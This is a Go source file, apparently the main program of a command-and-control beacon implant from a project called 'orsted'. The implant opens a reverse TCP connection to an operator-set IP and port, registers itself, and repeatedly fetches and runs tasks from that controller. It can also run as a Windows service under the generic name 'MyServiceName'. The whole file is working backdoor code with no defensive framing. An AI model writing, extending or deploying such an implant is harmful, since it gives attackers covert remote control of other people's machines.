//go:build http
// +build http
package main

import (
	"fmt"
	"log"
	"time"

	"golang.org/x/sys/windows/svc"

	"orsted/beacon/core"
	"orsted/beacon/peers"
	"orsted/beacon/utils"
	"orsted/profiles"
)

var (
	Targetip   string
	Targetport string
)

func beaconReverseTcp() {
	_ = profiles.InitialiseProfile()

	// TODO: Find a way to pass IP and Port as argument
	trp, _ := peers.NewTCPReversePeer(profiles.Config, Targetip, Targetport)
	utils.ParentPeer = trp
    utils.Print("Starting Reverse TCP")

	// Registering Beaocn by talking with parent peer
	beaconId, err := core.RegisterBeacon(trp)
	if err != nil {
        utils.Print("Error while registering", err.Error())
	}

    utils.Print("Connection ID", beaconId)
	utils.CurrentBeaconId = beaconId
	for {
		time.Sleep(time.Millisecond * time.Duration(profiles.Config.Interval))

		// Ask Parent peer to give tasks
		tasks, err := core.RetreiveTask(trp, beaconId)
		if err != nil {
            utils.Print("Error while retreiving task from parent peer", err.Error())
		}
		core.HandleTasks(*tasks, core.SendTaskResult)

	}
}

type myService struct{}

func (m *myService) Execute(args []string, req <-chan svc.ChangeRequest, status chan<- svc.Status) (bool, uint32) {
	status <- svc.Status{State: svc.StartPending}

	beaconReverseTcp()

	status <- svc.Status{State: svc.Running, Accepts: svc.AcceptStop | svc.AcceptShutdown}
	log.Println("Service started")

loop:
	for {
		select {
		case c := <-req:
			switch c.Cmd {
			case svc.Stop, svc.Shutdown:
				log.Println("Service stopping...")
				break loop
			}
		case <-time.After(2 * time.Second):
			log.Println("Service is running...")
		}
	}

	status <- svc.Status{State: svc.StopPending}
	log.Println("Service stopped")
	return false, 0
}

func isWindowsService() (bool, error) {
	isService, err := svc.IsWindowsService()
	if err != nil {
		return false, err
	}
	return isService, nil
}

func main() {
	isService, err := isWindowsService()
	if err != nil {
		log.Fatalf("Failed to determine if running as service: %v", err)
	}

	if isService {
		err = svc.Run("MyServiceName", &myService{})
		if err != nil {
			log.Fatalf("Failed to start service: %v", err)
		}
	} else {
		fmt.Println("Running as console application. Press Ctrl+C to exit.")
		m := &myService{}
		go m.Execute(nil, make(chan svc.ChangeRequest), make(chan svc.Status))

		select {}
	}
}
